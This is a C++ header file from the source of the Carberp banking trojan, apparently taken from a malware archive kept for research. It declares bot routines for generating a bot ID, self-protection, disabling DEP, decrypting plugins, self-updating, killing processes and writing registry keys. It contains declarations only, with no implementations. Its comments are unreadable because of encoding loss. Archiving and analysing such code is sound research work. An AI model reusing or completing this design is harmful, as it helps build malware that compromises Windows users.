/*
  name      Carberp
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */

#ifndef UtilsH
#define UtilsH
//----------------------------------------------------------------------------

#include <windows.h>


#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5



BOOL IsUserAdmin(/* � ��� ������ ��� ��� ���������� */);
bool IsUserLocalSystem();

#ifdef _DEBUG
	VOID DbgPrint(PCHAR pcFormat,...);
#else
 #define DbgPrint
#endif




VOID FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New);
BOOL CheckWow64();
BOOL CheckUAC();
BOOL CheckAdmin();
BOOL CheckSidCurrentProcess( SID_IDENTIFIER_AUTHORITY &NtAuthority );

//
// ���������� ���� �� ������� �������
//
PVOID MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize);

DWORD RvaToOffset(PIMAGE_NT_HEADERS pPE,DWORD dwRva);


//DWORD CalcHash( char *Str );
//DWORD CalcHashW( PWSTR str );
DWORD GetProcessIdByHash( DWORD dwHash );
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param );
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();


bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread,PWCHAR CommandLine = NULL );
bool MakeUpdate( WCHAR *FileName );


char * FileToMD5(char *URL);
PCHAR MakeMachineID();

void GenerateUid( char *BotUid );

char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

void ProtectBot();
void UnProtectBot();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// ������� ���������� ������������� �������� ���������� (Explorer.exe)
DWORD GetExplorerPid();

//
// ������� �������
// ������ ���� ������ �� ������� ��������, ��������� ���� ������� �������� �����������.
//
BOOL KillProcess(DWORD pid,DWORD TimeOut = INFINITE);

#define min(a,b)            (((a) < (b)) ? (a) : (b))

//****************************************************************************
//  Random  ������ ��� ��������� ��������� �����
//****************************************************************************
namespace Random
{
	// ���������������� ��������� ��������� �����
	void Initialize();

	// ������������ ��������� �����
	DWORD Generate();

	// ������������ ��������� ����� � ��������� �� Min �� Max
	DWORD Generate(DWORD Min, DWORD Max);

	// ������������ ������ ��������� ��������
	// Min, Max - �������� ��������� ��������
	PCHAR RandomString(DWORD Length, char Min, char Max);
}



//******************************************************************
//  GenerateBotID - ������� ���������� ������������� ����
//
//  ��������� - ������ ��������� �������� StrNew. ����������
//              �������� StrFree
//******************************************************************
PCHAR GenerateBotID();

//******************************************************************
//  DirExists - ������� ���������� ������ ���� ����  Path ceotcndetn
//******************************************************************
bool DirExists(PCHAR Path);


//******************************************************************
//  FileExists* - ������� ���������� ������ ���� ����  FileName
//  			  ����������
//******************************************************************
bool FileExistsA(PCHAR FileName);
bool FileExistsW(PWCHAR FileName);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
bool isFileExists(int FlagFolderDest, WCHAR*Path);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
// �� ��� ������ �����
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ���������� ��� ������
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);

//----------------------------------------------------------------------------
// ������� ������ ������ � ����������
//----------------------------------------------------------------------------

typedef  LPWIN32_FIND_DATAA PFindData;

typedef void (* TFilesCallBack)(PFindData Search, // ��������� ������
								PCHAR FileName,   // ��� ���������� �����
								LPVOID Data,      // ������ ���������� � ������� ������
								bool &Cancel      // �������� �������� ���������� �����
								);

#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
					   FILE_ATTRIBUTE_HIDDEN   |\
					   FILE_ATTRIBUTE_SYSTEM   |\
					   FILE_ATTRIBUTE_ARCHIVE)

#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY

//******************************************************************
//  SearchFiles  - ������� ���������� ���  �������������
//
//  Path - ����� � �������� ���������� �����. ������ �������������
//         �������� ������ \\
//  Mask - ����� ������. *.* ��� ���� ������
//
//  Recursive - ����������� ����������� �����
//
//  FileAttributes - �������� ������� ������
//
//  Data - ������ ������� ����� �������� � ����� �������� �����
//
//  CallBack - ����� �������� �����
//
//  ��������� - ������� ���������� ������ ���� ����� �� ��� �������
//              �� ������ �������� �����
//
//******************************************************************
bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack);


//******************************************************************
//  GetUniquePID - ������� ���������� �������� �������������
//	   �������� ��������. ������� �� GetProcessID() � ���, ���
//     ���������� ���������� �������� ��� �������� ���������
//******************************************************************
DWORD GetUniquePID();


//******************************************************************
//  IsNewProcess - ������� ��������� ������������� ��������
//		�������� �� ��������� ProcessID � ���������� ������ ����
//		��� ����������. � ������ ������� �������� ProcessID
//      ��������������
//******************************************************************
bool IsNewProcess(DWORD &ProcessID);


//----------------------------------------------------------------------------
// Registry - ������ ��� ������ � �������� Windows
//----------------------------------------------------------------------------

namespace Registry
{
	// ������� ������ � ������� ������ CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	bool CreateKey(HKEY h, char* path, char* name );
	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(�������� �������� REG_SZ)
	bool SetValueString(HKEY h, char* path, char* name,  char* values );
	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� DWORD)
	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );

	// ������� �������� ��������� �������� �� �������
    PCHAR GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value);

	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� REG_SZ)
	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
	bool CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise );
}

//----------------------------------------------------------------------------
// FILE - ������ ��� ������ � �������, ������� ������
//----------------------------------------------------------------------------

namespace File
{
	// �������� ������ �� ������ � ����
	DWORD WriteBufferA(PCHAR FileName, LPVOID Buffer, DWORD BufferSize);
	DWORD WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize);

	// ��������� ���� � �����
	LPBYTE ReadToBufferA(PCHAR FileName, DWORD &BufferSize);
	LPBYTE ReadToBufferW(PWCHAR FileName, DWORD &BufferSize);

	// �������� ���������� �����. �������� ������ ������ FileName!!!
	// ���������� - ���������� �������� ������ � ������
	// ��������� - ����� ������ � ������ �����
	PCHAR ChangeFileExt(PCHAR FileName, PCHAR Ext);

	// �������� ���������� ��� ����� �� ������� �����
    PCHAR ExtractFileName(PCHAR FileName);

	// ������� ��������� ��� ��������� ������
	PCHAR GetTempNameA();

	// �������� ���������� ������ ���� � ����� � ������
	PCHAR ExtractFilePath(PCHAR FileName);
}

//**********************************************************************
//  EnumDrives - ������� ���������� ��� ����� ���������� ����
//               ����������� DRIVE_UNKNOWN ��� �������� ����
//               ������ � �������
//**********************************************************************
typedef void (*TEnumDrivesMethod)(PCHAR Drive, LPVOID Data, bool &Cance);

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data);




// ������� ��������� ��� ���������� �����
char *CalcFileMD5Hash(char *szFileName);

char *GetWndText( HWND hWnd );
char *GetNetInfo();
DWORD GetFileFormat( WCHAR *lpFileName );
void MakeShutdown();


//----------------------------------------------------------------------------
#endif
